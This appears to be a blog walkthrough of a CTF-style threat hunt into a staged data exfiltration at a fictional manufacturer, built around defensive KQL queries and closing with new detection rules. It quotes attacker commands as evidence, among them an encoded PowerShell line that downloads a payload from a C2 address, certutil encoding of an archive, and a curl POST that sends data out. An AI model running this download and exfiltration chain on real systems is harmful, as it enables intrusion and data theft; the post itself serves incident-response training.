---
title: "Case Study: The Argon Dynamics Data Spill — A Hunt Walkthrough"
date: 2025-06-22
categories:
  - blog
  - ctf
tags:
  - incident-response
  - threat-hunting
  - data-exfiltration
  - walkthrough
  - case-study
toc: true
toc_label: "Contents"
header:
  teaser: /assets/images/posts/argon-nexus.png
excerpt: "A regional company suffered an internal data spill. Walk through the investigation process — from first alert to full reconstruction of the attacker's timeline."
---

> **Scenario Context**: Argon Dynamics is a small regional manufacturing company. They detected an anomaly in their DLP system suggesting internal data may have been copied and staged. No external alert fired. This is a hunt walkthrough using the [argon_nexus scenario](/argon_nexus) — you can follow along with the challenge artifacts.

---

## The Initial Signal

The investigation started with a single DLP alert: a user account had accessed an unusually high number of files in the Finance shared drive over a 20-minute window.

On its own, this could be a legitimate bulk operation — a manager pulling end-of-quarter reports. What made it suspicious:

- The access occurred at **02:17 AM on a Tuesday**
- The user account (`svc_reportgenerator`) is a **service account**, not a human
- The account had never previously accessed the Finance share

This is the moment a hunter forms a hypothesis: **"A service account with a predictable credential was compromised and used to stage data for exfiltration."**

---

## Phase 1: Validate the Initial Signal

**Question 1: Is this account legitimately used for anything in Finance?**

```kql
// Check historic access patterns for this account
SecurityEvent
| where EventID == 4663  // Object access
| where SubjectUserName == "svc_reportgenerator"
| where ObjectName contains "Finance"
| summarize 
    AccessCount = count(),
    FirstSeen = min(TimeGenerated),
    LastSeen = max(TimeGenerated)
    by bin(TimeGenerated, 1d)
| order by TimeGenerated desc
```

**Result**: Zero prior access to Finance share. This is confirmed anomalous.

**Question 2: What exactly was accessed?**

```kql
SecurityEvent
| where EventID == 4663
| where SubjectUserName == "svc_reportgenerator"
| where TimeGenerated between (datetime(2025-06-10 02:00) .. datetime(2025-06-10 03:00))
| summarize 
    FilesAccessed = make_set(ObjectName),
    AccessCount = count()
    by ObjectType, AccessMask
```

**Result**: 847 file access events. Mostly `.xlsx` and `.pdf` files. Access mask `0x1` = ReadData. This account was reading, not writing — consistent with staging for exfiltration.

---

## Phase 2: Where Did This Account Authenticate From?

If someone compromised this service account, they logged in from somewhere. Find it.

```kql
SecurityEvent
| where EventID == 4624
| where TargetUserName == "svc_reportgenerator"
| where TimeGenerated > ago(7d)
| project TimeGenerated, IpAddress, WorkstationName, LogonType, AuthenticationPackageName
| order by TimeGenerated desc
```

**Result**: The account authenticated from `192.168.4.47` — a workstation (`WS-FINANCE-04`) that isn't associated with any service account usage. A human workstation.

**Question**: Who normally logs into `WS-FINANCE-04`?

```kql
SecurityEvent
| where EventID == 4624
| where Computer == "WS-FINANCE-04"
| where LogonType == 2  // Interactive
| summarize LastUser = arg_max(TimeGenerated, TargetUserName) by Computer
```

**Result**: Last interactive logon was `m.chen` — a Finance analyst. The machine is hers.

---

## Phase 3: What Happened on That Workstation?

The service account authenticated from Maya Chen's workstation. Either Maya's machine was compromised, or Maya used the service account credentials herself. Either way, her machine is the pivot point.

```kql
// Process activity on WS-FINANCE-04 around the incident window
DeviceProcessEvents
| where DeviceName == "WS-FINANCE-04"
| where Timestamp between (datetime(2025-06-10 01:30) .. datetime(2025-06-10 03:00))
| project Timestamp, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp asc
```

**What we found** (reconstructed timeline):

```
01:47  cmd.exe            → spawned by explorer.exe (user opened command prompt)
01:48  whoami.exe         → "who am I?" — basic enumeration
01:49  net.exe            → "net user /domain" — Active Directory enumeration
01:52  net.exe            → "net group 'Domain Admins' /domain" — privilege enumeration
01:59  powershell.exe     → encoded command (Base64)
02:03  xcopy.exe          → source: \\FILESERVER01\Finance\  dest: C:\Users\mchen\AppData\Local\Temp\rpt\
02:17  robocopy.exe       → same source, same dest — bulk file copy
02:38  WinRAR.exe         → compressed C:\Users\mchen\AppData\Local\Temp\rpt\ → archive.rar
02:41  certutil.exe       → "certutil -encode archive.rar archive.b64" — base64 encoding
02:44  curl.exe           → outbound POST to 185.234.xx.xx:443
```

This is a complete exfiltration chain. Five minutes of enumeration, twenty minutes of copying, then staging, encoding, and exfiltration over HTTPS.

---

## Phase 4: Decode the PowerShell

The encoded PowerShell at 01:59 is hiding something. Let's decode it.

```powershell
# The command line captured by EDR:
# powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvADEAOAA1AC4AMgAzADQALgAxADIAMwAuADQANQAvAHAAYQB5AGwAbwBhAGQAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXAB3AHUALgBlAHgAZQAiAA==

# Decode:
[System.Text.Encoding]::Unicode.GetString(
  [System.Convert]::FromBase64String("SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvADEAOAA1AC4AMgAzADQALgAxADIAMwAuADQANQAvAHAAYQB5AGwAbwBhAGQAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXAB3AHUALgBlAHgAZQAiAA==")
)

# Result:
# Invoke-WebRequest -Uri "https://185.234.123.45/payload" -OutFile "C:\Windows\Temp\wu.exe"
```

The PowerShell downloaded a second-stage payload from the attacker's C2 server. The file was saved as `wu.exe` — disguised as a Windows Update binary.

---

## Phase 5: How Did They Get In?

We know what happened. We need to know how it started. Work backwards from the first anomaly.

**When did the attacker first appear on Maya's machine?**

```kql
DeviceNetworkEvents
| where DeviceName == "WS-FINANCE-04"
| where RemoteIP == "185.234.123.45"
| order by Timestamp asc
| take 1
```

**Result**: First connection at `2025-06-09 18:23` — the day before the data exfiltration. The attacker had been on the machine for **7 hours and 24 minutes** before taking action.

**What was Maya doing at 18:23?**

Email logs showed Maya received a phishing email at 17:58 with a malicious Excel attachment (`Q2_Budget_Review.xlsm`). She opened it at 18:22. One minute later, the C2 connection established.

---

## Incident Timeline (Reconstructed)

```
Day 1
17:58  Phishing email received by m.chen
18:22  Malicious Excel document opened
18:23  Macro executed → PowerShell → wu.exe downloaded
18:24  C2 beacon established (185.234.123.45)
18:26–21:14  Attacker performs reconnaissance (quiet, low-and-slow)

Day 2
01:47  Attacker activates session — command prompt opened
01:48–01:58  Active Directory enumeration
01:59  Second-stage PowerShell payload
02:03–02:36  Bulk file copy from Finance share using svc_reportgenerator credentials
02:38  Files archived with WinRAR
02:41  Archive base64-encoded with certutil
02:44  Data exfiltrated via HTTPS POST
02:46  Session closed
```

---

## What Should Have Fired (And Didn't)

This incident exposed five detection gaps:

1. **No alert on macro-enabled Office documents** from external email
2. **No alert on encoded PowerShell** (we now have one — see the [Sigma rules](/research/sigma))
3. **Service account used interactively from a workstation** — should never happen
4. **certutil used to encode a file** — classic LOLBin abuse
5. **Outbound HTTPS from a non-browser process** to a low-reputation IP

Every gap is now a detection rule. The attacker educated us for free.

---

## Detections Added Post-Incident

See the full rule set in [/research/sigma](/research/sigma/). Rules added from this investigation:

- `T1059.001-powershell-encoded-command.yml`
- `T1078.002-service-account-interactive-logon.yml`
- `T1140-certutil-encode.yml`
- `T1048-exfiltration-non-browser-https.yml`

---

*Try the full scenario yourself: [Argon Nexus CTF Challenge](/ctf/argon-nexus/)*
